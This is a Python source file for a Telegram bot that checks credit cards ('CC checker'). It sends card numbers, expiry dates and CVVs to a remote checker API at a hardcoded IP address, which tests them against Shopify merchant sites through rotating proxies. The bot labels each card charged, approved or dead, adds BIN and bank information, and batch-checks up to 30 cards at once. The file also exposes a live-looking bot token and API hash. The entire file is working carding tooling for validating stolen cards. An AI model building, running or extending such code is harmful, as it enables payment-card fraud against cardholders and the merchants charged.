from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

API_ID = 33552520
API_HASH = 'd82affa92dd5a1dbaa3087aa19a732f2'
BOT_TOKEN = '8989181458:AAEAwMeByux4jJvx4xB62xQfQO-DLRD_F1M'
ADMIN_ID = [7132150988]
CHECKER_API_URL = 'http://108.165.213.40:5000//shopify_parallel'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}


PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cmd", b"show_cmds", style="success"),
         Button.url(" Channel", "https://t.me/meowmeow7070", style="success")]
    ]
    
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Admin Panel", b"admin_panel", style="success")])
    
    return buttons


def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w', encoding='utf-8') as f:
            for admin in ADMIN_ID:
                f.write(f"{admin}\n")
        return [str(admin) for admin in ADMIN_ID]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        needs_write = False
        for admin in ADMIN_ID:
            if str(admin) not in users:
                users.append(str(admin))
                needs_write = True
        if needs_write:
            with open(PREMIUM_USERS_FILE, 'w', encoding='utf-8') as f:
                for u in users:
                    f.write(f"{u}\n")
        return users
    except Exception as e:
        print(f"Error loading premium users: {e}")
        return [str(admin) for admin in ADMIN_ID]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

async def add_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

async def remove_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) in premium_users:
        premium_users.remove(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return True
    
    if not gateway or gateway == "Unknown":
        return True
    
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    
    return False

# ========== SIMPLIFIED: Only binlist.net ==========
async def get_bin_info(card_number):
    """Fetch BIN info from binlist.net"""
    bin_number = card_number[:6]
    
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://lookup.binlist.net/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                text = await res.text()
                data = json.loads(text)
                
                brand = data.get('scheme', '') or data.get('brand', '')
                bin_type = data.get('type', '')
                level = data.get('level', '')
                bank_data = data.get('bank', {})
                bank = bank_data.get('name', '') if isinstance(bank_data, dict) else ''
                country_data = data.get('country', {})
                country = country_data.get('name', '') if isinstance(country_data, dict) else ''
                flag = country_data.get('emoji', '') if isinstance(country_data, dict) else ''
                
                if brand or bank:
                    return (brand, bin_type, level, bank, country, flag)
    except:
        pass
    
    return '-', '-', '-', '-', '-', ''


def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        if not site.startswith('http'):
            site = f'https://{site}'
        
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy
        
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                
                try:
                    raw = await resp.json()
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price != '-' and price != 0:
            price = f"${price}"
        gateway = raw.get('Gateway', 'Shopify')
        status_api = raw.get('Status', False)

        if is_site_dead(response_msg, gateway, price):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        response_lower = response_msg.lower()

        if 'charged' in response_lower or 'order_placed' in response_lower or 'order_paid' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif any(key in response_lower for key in [
            'approved', 'success',
            'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip', 'cvv issue',
            '3d', '3d secure', 'otp', 'verification required',
            'authenticate', 'authentication required', 'challenge required',
            'redirecting to bank', 'bank verification', 'send code',
            'enter code', 'verify'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
    
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}


async def test_site(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
        
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead'}
                try:
                    raw = await resp.json()
                except:
                    return {'site': site, 'status': 'dead'}
        
        response_msg = raw.get('Response', '')
        gateway = raw.get('Gateway', '')
        price = raw.get('Price', '-')
        
        if is_site_dead(response_msg, gateway, price):
            return {'site': site, 'status': 'dead'}
        else:
            return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'
        
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead'}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   🦉 Add proxy: <code>/addproxy</code>
   🦉 Add sites: <code>/site</code>
   🦉 Check CC: <code>/cc card|mm|yy|cvv</code>
   🦉 Multi Check: <code>/mcc card|mm|yy|cvv ...</code>

🐱 Make By MEOW MEOW"""
    
    buttons = get_main_menu_keyboard(user_id)
    
    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 User Commands

🛒 Shopify
├─ <code>/cc cc|mm|yy|cvv</code> → Check single card
└─ <code>/mcc</code> → Multi single-check (up to 30 cards)

🔧 Site Management
├─ <code>/site</code> → Check & remove dead sites
└─ <code>/rm url</code> → Remove a specific site

🔌 Proxy Management
├─ <code>/proxy</code> → Check & remove dead proxies
├─ <code>/addproxy</code> → Add proxies
├─ <code>/chkproxy proxy</code> → Check single proxy
├─ <code>/rmproxy proxy</code> → Remove single proxy
├─ <code>/rmproxyindex 1,2,3</code> → Remove by index
├─ <code>/clearproxy</code> → Remove all proxies
└─ <code>/getproxy</code> → Get all proxies"""
    
    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')
    
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.answer("❌ Access Denied. Admin only.", alert=True)
        return
    
    admin_text = """👑 <b>Admin Panel</b>

📋 <b>Premium Management</b>
├─ <code>/addpremium user_id</code> → Add user to premium
├─ <code>/removepremium user_id</code> → Remove user from premium
└─ <code>/listpremium</code> → List all premium users

🌐 <b>Sites Management</b>
├─ <code>/addsites</code> → Reply to .txt file to upload sites
└─ <code>/getsites</code> → Download current sites.txt

📊 <b>Bot Statistics</b>
└─ <code>/stats</code> → Show bot statistics"""
    
    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')
    
@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   ➥ Add proxy: <code>/addproxy</code>
   ➥ Add sites: <code>/site</code>
   ➥ Check CC: <code>/cc card|mm|yy|cvv</code>
   ➥ Multi Check: <code>/mcc card|mm|yy|cvv ...</code>

🐱 Make By MEOW MEOW"""
    
    buttons = get_main_menu_keyboard(user_id)
    
    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]

    status_msg = await event.reply(premium_emoji(f"🔄 Checking <code>{card}</code>..."), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_header = "💎 CHARGED"
        elif result['status'] == 'Approved':
            status_header = "✅ APPROVED"
        else:
            status_header = "❌ DECLINED"

        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gateway {result.get('gateway', 'Unknown')}
📝 Response {result['message'][:150]}
💸 Price {result.get('price', '-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}

👤 Checked by @{username}

🐱 Make By MEOW MEOW"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
# ========== NEW: /mcc command ==========
@bot.on(events.NewMessage(pattern='/mcc'))
async def multi_cc_check(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    # --- Input: either reply to txt file or inline cards ---
    if event.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ Please reply to a .txt file or type cards inline.\nUsage: <code>/mcc card|mm|yy|cvv card|mm|yy|cvv ...</code>"), parse_mode='html')
            return

        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
        cards = extract_cc(content)
    else:
        parts = event.message.text.split(' ', 1)
        if len(parts) < 2:
            await event.reply(
                premium_emoji("📋 <b>Multi CC Check</b>\n\nUsage:\n• <code>/mcc card|mm|yy|cvv ...</code>\n• Reply to .txt file with <code>/mcc</code>\n\nMax: <b>30 cards</b>"),
                parse_mode='html'
            )
            return

        cards = extract_cc(parts[1])

    if not cards:
        await event.reply(premium_emoji("❌ No valid cards found. Format: <code>card|mm|yy|cvv</code>"), parse_mode='html')
        return

    if len(cards) > 30:
        await event.reply(premium_emoji(f"⚠️ Found {len(cards)} cards. Limiting to first <b>30</b>."), parse_mode='html')
        cards = cards[:30]

    total = len(cards)

    # --- Start progress message ---
    status_msg = await event.reply(
        premium_emoji(f"🔄 <b>Multi CC Check Started</b>\n\n📊 Total: <b>{total}</b> cards\n⏳ Progress: 0/{total}"),
        parse_mode='html'
    )

    # --- Track results ---
    charged = []
    approved = []
    declined = []
    session_key = f"mcc_{user_id}_{status_msg.id}"
    stop_callback = f"stop_mcc_{user_id}_{status_msg.id}".encode()
    active_sessions[session_key] = {}

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)

        checked_count = [0]
        last_update = [time.time()]
        lock = asyncio.Lock()

        async def mcc_worker():
            while not queue.empty() and session_key in active_sessions:
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    # Fix: card loss — mark as declined instead of breaking
                    async with lock:
                        checked_count[0] += 1
                        declined.append({
                            'status': 'Dead',
                            'message': 'No sites/proxies available',
                            'card': card,
                            'site': 'Unknown',
                            'gateway': 'Unknown',
                            'price': '-'
                        })
                    queue.task_done()
                    continue

                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=3)

                # --- BIN info ---
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

                # --- Status header ---
                if res['status'] == 'Charged':
                    status_header = "💎 CHARGED"
                    charged.append(res)
                elif res['status'] == 'Approved':
                    status_header = "✅ APPROVED"
                    approved.append(res)
                else:
                    status_header = "❌ DECLINED"
                    declined.append(res)

                # --- Build response with Site ---
                message = f"""{status_header}

💳 CC <code>{res['card']}</code>

🌐 Site {res.get('site', 'Unknown')}
🛒 Gateway {res.get('gateway', 'Unknown')}
💸 Price {res.get('price', '-')}
📝 Response {res.get('message', '-')[:200]}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}

👤 Checked by @{username}

🐱 Make By MEOW MEOW"""

                # --- Send inline result ---
                try:
                    await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
                    await asyncio.sleep(0.3)
                except Exception:
                    pass

                # --- Update progress ---
                async with lock:
                    checked_count[0] += 1
                    now = time.time()
                    if now - last_update[0] >= 2.0:
                        last_update[0] = now
                        try:
                            await bot.edit_message(
                                user_id, status_msg.id,
                                premium_emoji(
                                    f"🔄 <b>Multi CC Check</b>\n\n"
                                    f"📊 Total: <b>{total}</b>\n"
                                    f"⏳ Progress: <b>{checked_count[0]}/{total}</b>\n"
                                    f"💎 Charged: {len(charged)} | ✅ Approved: {len(approved)} | ❌ Declined: {len(declined)}"
                                ),
                                buttons=[
                                    [Button.inline("🛑 STOP", stop_callback, style="danger")]
                                ],
                                parse_mode='html'
                            )
                        except Exception:
                            pass

                queue.task_done()

        # --- Run 5 workers ---
        workers = [asyncio.create_task(mcc_worker()) for _ in range(5)]

        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        # --- Final summary with Site ---
        if session_key in active_sessions:
            try:
                await status_msg.delete()
            except:
                pass

            hits_text = ""
            if charged:
                hits_text += "\n💎 <b>CHARGED:</b>\n"
                for r in charged:
                    hits_text += f"  • <code>{r['card']}</code> — 🌐 {r.get('site', 'Unknown')[:40]}\n"
                    hits_text += f"     🛒 {r.get('gateway', 'Unknown')} | 💸 {r.get('price', '-')}\n"
            if approved:
                hits_text += "\n✅ <b>APPROVED:</b>\n"
                for r in approved:
                    hits_text += f"  • <code>{r['card']}</code> — 🌐 {r.get('site', 'Unknown')[:40]}\n"
                    hits_text += f"     🛒 {r.get('gateway', 'Unknown')} | 💸 {r.get('price', '-')}\n"

            if not hits_text:
                hits_text = "\n😱 No hits found in this batch."

            summary = f"""📊 <b>MCC Check Complete!</b>

💎 Charged: <b>{len(charged)}</b>
✅ Approved: <b>{len(approved)}</b>
❌ Declined: <b>{len(declined)}</b>
📦 Total: <b>{total}</b>
{hits_text}

👤 Checked by @{username}

🐱 Make By MEOW MEOW"""

            await bot.send_message(user_id, premium_emoji(summary), parse_mode='html')

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]


@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addproxy</code> followed by proxies, one per line."), parse_mode='html')
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
            return

        current_proxies = load_proxies()
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All proxies already exist."), parse_mode='html')
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ Added {len(new_proxies)} proxies!"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ proxy.txt is empty."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(proxies)} proxies..."), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(premium_emoji(f"🔄 Checking proxies...\n\nChecked: {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\nAlive: {len(alive_proxies)}\nDead: {len(dead_proxies)}"), parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        await status_msg.edit(premium_emoji(f"✅ Proxy check complete!\n\nTotal: {len(proxies)}\nAlive: {len(alive_proxies)}\nRemoved: {len(dead_proxies)}"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Removed {len(removed)} proxies!\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ proxy.txt is already empty."), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"📦 Backup created!\n\nSending backup of {count} proxies..."), file=backup_filename, parse_mode='html')

        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ Cleared all {count} proxies!\n\nproxy.txt is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

